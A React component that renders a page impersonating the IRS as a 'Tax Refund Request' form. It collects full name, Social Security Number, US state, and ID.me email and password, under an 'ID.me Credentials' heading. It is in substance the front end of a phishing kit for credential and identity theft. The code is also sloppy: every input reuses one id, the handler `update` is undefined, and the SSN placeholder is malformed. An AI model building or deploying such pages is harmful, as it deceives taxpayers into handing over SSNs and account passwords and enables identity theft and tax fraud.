import React, { useState } from 'react'
import ThemeToggleButton from '../../components/ThemeToggleButton'
import { Bell, CalendarDays, Receipt, User, ShieldCheck, Mail, LockKeyhole, Key, Globe } from 'lucide-react'

const Irs = ({ theme, setTheme }) => {

    const date = new Date().toLocaleDateString('en-Us', {
        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
    })

    const [showNotif, setShowNotif] = useState(false)


    const states = [
        "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado",
        "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho",
        "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana",
        "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota",
        "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada",
        "New Hampshire", "New Jersey", "New Mexico", "New York",
        "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
        "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota",
        "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington",
        "West Virginia", "Wisconsin", "Wyoming"
    ]


    return (
        <div className='px-3'>
            <div className='hidden xl:flex items-center justify-between'>
                <div className='flex items-center gap-2 text-zen-light-muted dark:text-zen-muted text-sm'>
                    <CalendarDays size={16} /><span>{date}</span>
                </div>
                <div className='flex items-center gap-3'>
                    <div className='relative' onClick={e => e.stopPropagation()}>
                        <button onClick={() => setShowNotif(!showNotif)} className='p-2 rounded-full hover:bg-zen-light-card dark:hover:bg-zen-card'>
                            <Bell size={24} className='text-zen-light-muted dark:text-zen-muted' />
                        </button>
                        {showNotif && (
                            <div className='absolute right-0 top-10 w-[350px] p-3 rounded-md border border-white/10 shadow-lg bg-white dark:bg-zinc-900 z-50'>
                                <div className='flex justify-between border-b border-gray-200/40 dark:border-white/10 p-2'>
                                    <p className='text-gray-900 dark:text-white font-medium'>Notifications</p>
                                    <p className='text-blue-500 cursor-pointer text-sm'>Mark as read</p>
                                </div>
                            </div>
                        )}
                    </div>
                    <ThemeToggleButton theme={theme} setTheme={setTheme} />
                </div>
            </div>
            <div className='pt-10'>
                <div className="w-14 h-14 sm:w-16 sm:h-16 mx-auto rounded-full bg-blue-400 flex items-center justify-center mb-3 sm:mb-4">
                    <Receipt size={48} />
                </div>

                <h1 className='text-center text-[20px] xl:text-3xl font-bold'> IRS Tax Refund Request</h1>
                <p className='text-center '>Please fill out the form below to submit your IRS tax refund request</p>

            </div>

            <section className="w-full xl:w-4xl mx-auto bg-slate-50 border border-slate-200 rounded-xl p-5 sm:p-6">
                <form action="" className="flex flex-col gap-5 bg-white border border-slate-200 rounded-lg p-4 w-full">

                    {/* Section header */}
                    <div className="inline-flex items-center gap-2 text-lg font-medium">
                        <User className="w-5 h-5" />
                        Personal Information
                    </div>

                    {/* Full Name field */}
                    <div className="flex flex-col gap-1.5">
                        <label htmlFor="fullName" className="text-sm font-medium text-zen-light-text dark:text-zen-text">
                            Full Name
                        </label>
                        <div className="relative">
                            <User className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zen-light-muted dark:text-zen-muted" />
                            <input
                                id="fullName"
                                type="text"
                                required
                                placeholder="Enter your full name"
                                className="w-full pl-10 pr-4 py-3 rounded-xl dark:bg-zen-bg border border-blue-200 dark:border-zen-border text-zen-light-text dark:text-zen-text placeholder:text-zen-light-muted dark:placeholder:text-zen-muted text-sm focus:outline-none focus:ring-2 focus:ring-zen-primary/50 focus:border-zen-primary transition"
                            />
                        </div>

                        <div className="flex flex-col gap-1.5">
                            <label htmlFor="fullName" className="text-sm font-medium text-zen-light-text dark:text-zen-text">
                                Social Security Number (SSN)
                            </label>
                            <div className='relative'>
                                <ShieldCheck className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zen-light-muted dark:text-zen-muted" />
                                <input
                                    id="fullName"
                                    type="text"
                                    required
                                    placeholder="XXXX-XX-XXXX"
                                    className="w-full pl-10 pr-4 py-3 rounded-xl dark:bg-zen-bg border border-blue-200 dark:border-zen-border text-zen-light-text dark:text-zen-text placeholder:text-zen-light-muted dark:placeholder:text-zen-muted text-sm focus:outline-none focus:ring-2 focus:ring-zen-primary/50 focus:border-zen-primary transition"
                                />

                            </div>
                        </div>


                        <div className="inline-flex items-center gap-2 text-lg font-medium ">
                            <LockKeyhole className="w-5 h-5" />
                            ID.me Credentials
                        </div>

                        {/* Full Name field */}
                        <div className="flex flex-col gap-1.5">
                            <label htmlFor="fullName" className="text-sm font-medium text-zen-light-text dark:text-zen-text">
                                ID.me Email
                            </label>
                            <div className="relative">
                                <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zen-light-muted dark:text-zen-muted" />
                                <input
                                    id="fullName"
                                    type="email"
                                    required
                                    placeholder="Enter your ID.me email"
                                    className="w-full pl-10 pr-4 py-3 rounded-xl dark:bg-zen-bg border border-blue-200 dark:border-zen-border text-zen-light-text dark:text-zen-text placeholder:text-zen-light-muted dark:placeholder:text-zen-muted text-sm focus:outline-none focus:ring-2 focus:ring-zen-primary/50 focus:border-zen-primary transition"
                                />
                            </div>

                            <div className="flex flex-col gap-1.5">
                                <label htmlFor="fullName" className="text-sm font-medium text-zen-light-text dark:text-zen-text">
                                    ID.me Password
                                </label>
                                <div className='relative'>
                                    <Key className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zen-light-muted dark:text-zen-muted" />
                                    <input
                                        id="fullName"
                                        maxLength={30}
                                        type="password"
                                        required
                                        placeholder=""
                                        className="w-full pl-10 pr-4 py-3 rounded-xl dark:bg-zen-bg border border-blue-200 dark:border-zen-border text-zen-light-text dark:text-zen-text placeholder:text-zen-light-muted dark:placeholder:text-zen-muted text-sm focus:outline-none focus:ring-2 focus:ring-zen-primary/50 focus:border-zen-primary transition"
                                    />

                                </div>
                            </div>
                            <div>
                                <div className="inline-flex items-center gap-2 text-lg font-medium ">
                                    <LockKeyhole className="w-5 h-5" />
                                    Location Information
                                </div>
                                <label className="block text-sm font-semibold text-zen-light-text dark:text-zen-text mb-1.5">
                                    States
                                </label>
                                <div className="relative">
                                    <Globe className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zen-light-muted dark:text-zen-muted pointer-events-none" />
                                    <select
                                        required

                                        onChange={(e) => update('state', e.target.value)}
                                        className="w-full pl-10 pr-4 py-3 rounded-xl bg-blue-50/80 dark:bg-zen-bg border border-blue-200 dark:border-zen-border text-zen-light-text dark:text-zen-text text-sm focus:outline-none focus:ring-2 focus:ring-zen-primary/50 focus:border-zen-primary transition appearance-none"
                                    >
                                        <option value="" disabled>Select your country</option>
                                        {states.map((c) => (
                                            <option key={c} value={c}>{c}</option>
                                        ))}
                                    </select>
                                </div>
                            </div>

                            <section className="bg-gradient-to-r from-sky-400 to-sky-100 border border-sky-200 rounded-2xl p-8 sm:p-10 text-center">
                                <p className="text-sm sm:text-base text-slate-600 mt-2">

                                    Important Notice
                                    Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.

                                </p>
                                <button className="mt-5 bg-teal-800 hover:bg-teal-900 text-white font-medium rounded-lg px-6 py-3 transition-colors">
                                    Send Request
                                </button>
                            </section>

                        </div>





                    </div>



                </form>

            </section>






        </div >






    )
}

export default Irs